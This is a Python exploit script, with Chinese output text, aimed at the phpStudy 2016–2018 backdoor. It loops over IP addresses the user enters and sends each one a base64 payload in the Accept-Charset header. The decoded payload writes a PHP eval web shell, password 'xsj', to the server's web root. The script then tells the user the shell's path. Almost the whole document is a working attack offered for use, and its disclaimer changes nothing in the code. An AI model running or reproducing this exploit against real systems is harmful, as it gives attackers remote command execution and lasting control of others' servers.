import requests
print("phpstudy2016~2018漏洞利用脚本\n")
print("密码xsj，地址为ip/xsj.php\n")
print("心视觉科技，请勿用于非法用途\n")
def write_mm(url,base64):
    headers = {}
    headers['User-Agent'] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"
    headers['Accept-Encoding'] = 'gzip,deflate'
    headers['Accept-Charset'] = base64
    try:
        request = requests.get(url, headers=headers)
        if request.status_code == 200:
            print('[+] 写入成功.')
            print(request.text)
        else:
            print('[-] 写入失败1.')
    except:
        print('[-] 写入失败2.\n')


if __name__ == "__main__":
    while True:
        url = input("请输入存在漏洞服务器的ip地址:\n")
        if 'http' not in url:
            url = "http://" + url
            write_mm(url,"c3lzdGVtKCJlY2hvIF48P3BocCBAZXZhbChcJF9QT1NUW3hzal0pOz9ePj5XV1cveHNqLnBocCIpOw==")
        
